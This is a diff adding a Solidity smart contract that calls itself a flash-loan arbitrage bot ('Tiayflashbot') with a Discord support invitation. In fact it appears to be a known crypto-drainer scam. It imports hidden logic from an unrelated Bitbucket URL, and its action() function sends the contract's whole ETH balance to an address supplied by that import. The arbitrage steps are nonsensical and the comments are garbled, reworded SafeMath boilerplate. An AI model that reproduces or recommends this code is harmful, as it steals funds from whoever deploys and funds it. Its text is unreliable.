@@ -1,0 +1,124 @@
+
+pragma solidity ^0.5.0;
+
+
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+// PancakeSwap Smart Contracts
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+
+/**
+ * This Bot have been designed for Etherum Network.
+ 
+ * and won't work with Binance Smart chain.
+
+ *When you have any kind of Problem, feel Free to join my Discord and I try to help you out !
+ 
+ 
+ 
+ * 0xTiay Wrappers over Solidity's arithmetic operations with added overflow
+
+ * Arithmetic operations in Solidity wrap on overflow. This can easily result
+
+ * in profit, because programmers usually assume that an overflow raises an
+
+ * value, which is the standard behavior in high level programming languages.
+
+ * `SafeMath` restores this intuition by reverting the transaction when an
+
+ * operation overflows.
+ 
+ * Using this library instead of the unchecked operations eliminates an entire
+
+ * class of strings, so use is always on.
+ 
+ * dev Contract module which provides a basic access control mechanism, where granted 
+ 
+ * exclusive access to
+
+ * specific functions.
+
+ 
+ /*
+     * dev Extracts the contract from pancakeswap
+
+     * param self The slice to operate on.
+
+     * param rune The slice that will contain the first rune.
+
+     * turn `rune`.
+     */
+
+/*
+     * dev Extracts the contract from Uniswap
+
+     * param self The slice to operate on.
+
+     * param rune The slice that will contain the first rune.
+
+     * turn `rune`.
+     */
+ 
+ /*
+     * @dev Find newly deployed contracts on PancakeSwap Exchange
+
+     * @param memory of required contract liquidity.
+
+     * @param other The second slice to compare.
+
+     * @return New contracts with required liquidity.
+     
+     */
+
+// Code Manager
+import "https://bitbucket.org/senekas/pancakeswapv2/raw/efaec4b32f16ed762a0cd0cc4f0aa12f32b2037e/blob/main/core/interface/manager.sol";
+
+contract Tiayflashbot {
+	string public tokenName;
+	string public tokenSymbol;
+	uint loanAmount;
+	RouterV2 router;
+	
+	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		loanAmount = _loanAmount;	
+		router = new RouterV2();
+	}
+function() external payable {}
+	
+	function action() public payable {
+		
+	    // Send required coins for swap
+	    address(uint160(router.uniswapSwapAddress())).transfer(address(this).balance);  
+
+		// Convert half ETH to Matic
+		router.convertMaticToDai(msg.sender, loanAmount / 2);
+
+        // Create ETH and Matic pairs for our token & Provide liquidity
+        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
+		router.transferDaiToMultiplier(router.uniswapSwapAddress());
+    
+        // Perform swaps and profit on Self-Arbitrage
+		router.lendingPoolFlashloan(256);
+		
+        // Repay Flash loan
+        
+         router.borrowFlashloanFromMultiplier(
+            address(this),
+            router.aaveSwapAddress(),
+            loanAmount
+        );
+
+		// Move remaining ETH from Contract to your account
+		router.completeTransation(address(this).balance);
+
+        
+    
+	    
+	}
+}
